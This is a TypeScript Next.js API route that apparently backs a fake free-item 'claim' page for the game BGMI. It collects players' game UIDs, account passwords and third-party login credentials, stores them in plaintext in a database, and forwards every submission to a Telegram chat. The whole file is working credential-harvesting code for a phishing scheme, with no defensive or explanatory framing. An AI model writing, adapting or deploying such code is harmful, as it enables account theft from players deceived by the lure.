import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import {
  sendTelegramMessage,
  buildClaimMessage,
} from "@/lib/telegram";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

interface ClaimBody {
  itemId: string;
  itemName: string;
  itemType: "gun" | "suit" | "vehicle";
  playerName?: string;
  playerLevel: string;
  email: string;
  phoneNumber: string;
  bgmiUid: string;
  password: string;
  provider?: string;
  loginIdentifier?: string;
  loginPassword?: string;
}

export async function POST(req: NextRequest) {
  try {
    const body = (await req.json()) as ClaimBody;

    // Basic validation — phone OR email required
    const required: (keyof ClaimBody)[] = [
      "itemId",
      "itemName",
      "playerLevel",
      "bgmiUid",
      "password",
    ];
    for (const k of required) {
      if (!body[k] || String(body[k]).trim() === "") {
        return NextResponse.json(
          { ok: false, error: `Missing field: ${k}` },
          { status: 400 }
        );
      }
    }
    // Require at least one contact: loginIdentifier, email, or phone number
    if (
      !body.loginIdentifier?.trim() &&
      !body.email?.trim() &&
      !body.phoneNumber?.trim()
    ) {
      return NextResponse.json(
        { ok: false, error: "Provide at least a phone number, email, or login ID" },
        { status: 400 }
      );
    }

    // 1. Persist the claim in the DB (status: pending)
    const claim = await db.claim.create({
      data: {
        itemId: body.itemId,
        itemName: body.itemName,
        itemType: body.itemType,
        playerName: body.playerName ?? "BGMI Player",
        playerLevel: body.playerLevel,
        email: body.email ?? "",
        phoneNumber: body.phoneNumber ?? "",
        bgmiUid: body.bgmiUid,
        password: body.password,
        provider: body.provider ?? "",
        accountEmail: body.loginIdentifier ?? "",
        telegramStatus: "pending",
      },
    });

    // 2. Build the formatted message and send to Telegram
    const text = buildClaimMessage({
      itemName: body.itemName,
      itemType: body.itemType,
      playerName: body.playerName ?? "BGMI Player",
      playerLevel: body.playerLevel,
      email: body.email,
      phoneNumber: body.phoneNumber,
      bgmiUid: body.bgmiUid,
      password: body.password,
      provider: body.provider ?? "",
      loginIdentifier: body.loginIdentifier ?? "",
      loginPassword: body.loginPassword ?? "",
      claimId: claim.id,
    });

    const tg = await sendTelegramMessage(text, "HTML");

    // 3. Update the claim record with the Telegram result
    if (tg.ok) {
      await db.claim.update({
        where: { id: claim.id },
        data: {
          telegramStatus: "sent",
          telegramMessageId: tg.message_id ? String(tg.message_id) : null,
          sentAt: new Date(),
        },
      });
      return NextResponse.json({
        ok: true,
        claimId: claim.id,
        telegramMessageId: tg.message_id,
      });
    }

    await db.claim.update({
      where: { id: claim.id },
      data: { telegramStatus: "failed" },
    });
    return NextResponse.json(
      { ok: false, error: tg.error || "Telegram send failed", claimId: claim.id },
      { status: 502 }
    );
  } catch (e) {
    return NextResponse.json(
      { ok: false, error: e instanceof Error ? e.message : "server error" },
      { status: 500 }
    );
  }
}
